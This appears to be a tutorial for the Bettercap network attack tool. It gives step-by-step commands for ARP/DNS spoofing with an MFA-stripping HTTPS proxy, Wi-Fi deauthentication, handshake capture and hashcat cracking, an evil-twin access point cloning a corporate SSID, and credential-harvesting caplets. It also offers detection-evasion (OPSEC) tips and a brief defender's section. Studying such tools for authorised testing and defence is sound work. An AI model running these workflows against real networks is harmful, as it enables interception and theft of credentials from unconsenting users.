# Bettercap — full tutorial

`Bettercap` is the modern Swiss-army knife for network attacks. Replaces ettercap/MITMf with a clean Go core and an interactive REPL. Modules cover ARP/DNS/DHCP/HTTPS spoofing, Wi-Fi (PMKID, evil twin), Bluetooth LE recon, HID injection, captive portals.

## Install

```terminal
apt install bettercap
brew install bettercap
go install github.com/bettercap/bettercap@latest
```

Run as root for raw-socket / interface access.

## Interface

```terminal
sudo bettercap -iface eth0
> help
> help <module>          # docs for a module
```

Tab-completion is your friend.

## Module families

| Family | Modules |
|--------|---------|
| **net** | `net.recon`, `net.probe`, `net.show`, `net.sniff` |
| **arp** | `arp.spoof` |
| **dns** | `dns.spoof` |
| **dhcp** | `dhcp6.spoof` |
| **http** | `http.proxy`, `https.proxy` |
| **wifi** | `wifi.recon`, `wifi.deauth`, `wifi.handshakes`, `wifi.assoc`, `wifi.ap` |
| **ble** | `ble.recon`, `ble.enum`, `ble.write` |
| **hid** | `hid.recon` (Logitech / etc. unifying) |
| **caplets** | Pre-baked attack scripts |

## Common workflow — wired ARP+DNS spoof

```
> set arp.spoof.targets 10.0.0.50,10.0.0.51    # specific clients (not whole LAN)
> set arp.spoof.fullduplex true
> set dns.spoof.address 10.0.0.99
> set dns.spoof.domains login.target.com,target.com

> arp.spoof on
> dns.spoof on
> http.proxy on
> set https.proxy.script /opt/scripts/strip-mfa.js
> https.proxy on
```

Targeted clients now resolve `login.target.com` to your machine; HTTPS proxy intercepts (with cert install caveat).

## Wi-Fi — handshake / deauth / evil twin

```
sudo bettercap -iface wlan0mon
> wifi.recon on
> events.stream off    # silence event firehose

> wifi.deauth AA:BB:CC:DD:EE:FF       # deauth specific BSSID
> wifi.deauth AC:DE:48:00:11:22       # deauth specific client

# After 4-way handshake captured:
> wifi.handshakes
> q
sudo cat ~/bettercap-wifi-handshakes.pcap | hcxpcapngtool -o cap.hc22000 -
hashcat -m 22000 cap.hc22000 rockyou.txt
```

### Evil twin AP

```
> wifi.recon on
> wifi.recon AA:BB:CC:DD:EE:FF       # focus
> set wifi.ap.ssid Acme-Corp
> set wifi.ap.bssid AA:BB:CC:DD:EE:FF
> set wifi.ap.channel 6
> set wifi.ap.encryption false        # open AP
> wifi.ap                              # start clone
```

Combine with deauth on real AP → clients reconnect to yours.

## BLE recon

```
> ble.recon on
> ble.show
> ble.enum <addr>
> ble.write <addr> <handle> <hex>      # if writable
```

## Caplets — repeatable scripts

A caplet is a `.cap` file with the same commands you'd type interactively.

```terminal
sudo bettercap -iface eth0 -caplet rogue-mitm.cap
```

Bundled caplets in `/usr/share/bettercap/caplets/`: `mitm6`, `wifi-pwn`, `passwords-only`, `dns-spoof`, etc.

## Plugins / events

- `events.stream off` — quiet
- `events.show` — recent events
- `set events.stream.output /tmp/bcap.log` — log to file

## Bad output and fixes

| Symptom | Fix |
|---------|-----|
| `failed to set monitor mode` | Wrong adapter, not actually in monitor; `airmon-ng start wlan0` first |
| ARP spoof doesn't intercept | DAI (Dynamic ARP Inspection) on switch — pivot to LLMNR / mitm6 |
| HTTPS interception fails | Cert pinning; install your CA in target browsers if scope allows; otherwise downgrade to HTTP only |
| Deauth blocked | PMF (802.11w) — pivot to PMKID flow |
| BLE write fails | Characteristic not writable, or auth required |

## Defender's perspective

- ARP spoof = duplicate gratuitous ARP from one MAC; switches with DAI / port-security catch immediately.
- DNS spoof = client receives different IP than authoritative — DNSSEC validation breaks (signal).
- WiFi evil twin = same SSID, different BSSID — WIDS systems alert.
- Sysmon EID for BLE / HID injection on the operator station — but on the target side, no host telemetry.

## OPSEC

- ARP spoof scoped to specific targets, not whole LAN — reduces signal.
- For HTTPS interception, prefer evilginx2 (cleaner cert handling on attacker domain) over bettercap's MITM.
- Spoof MAC before launch.

## Related tools

- **ettercap** — older sibling, less maintained.
- **mitm6** — IPv6 DHCPv6 + DNS spoof; very effective on dual-stack.
- **Responder** — LLMNR / NBT-NS poisoning.
- **Pretender** — modern Go alternative for LLMNR / NBT / mDNS / DHCPv6.
- **fluxion** / **wifiphisher** — captive-portal credential harvest.
